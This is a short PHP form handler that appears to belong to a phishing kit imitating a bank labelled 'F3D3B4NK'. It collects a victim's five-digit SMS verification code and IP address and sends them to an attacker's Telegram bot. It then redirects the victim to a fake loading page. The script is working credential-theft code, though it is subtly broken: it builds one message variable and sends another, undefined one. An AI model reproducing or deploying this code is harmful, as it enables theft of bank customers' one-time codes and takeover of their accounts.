<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Obtener los datos del formulario
    $codigo = $_POST['input1'] . $_POST['input2'] . $_POST['input3'] . $_POST['input4'] . $_POST['input5'];
    
    include "tg.php";
    $ip = $_SERVER['REMOTE_ADDR'];
    // Mensaje a enviar
    $mensaje = "F3D3B4NK:\nCodigo sms: $codigo\nIP cliente: $ip";  
    $message = str_replace("\n", "%0A", $message); 
    
    // URL de la API de Telegram
    $telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$message";
    
    // Enviar el mensaje a Telegram
    $response = file_get_contents($telegramApiUrl);
    header('Location: ../carga2.html');
    exit();
} else {
    // Si alguien intenta acceder directamente a esta página sin enviar el formulario, redirigir a la página de inicio
    header('Location: index.html');
    exit();
}

?>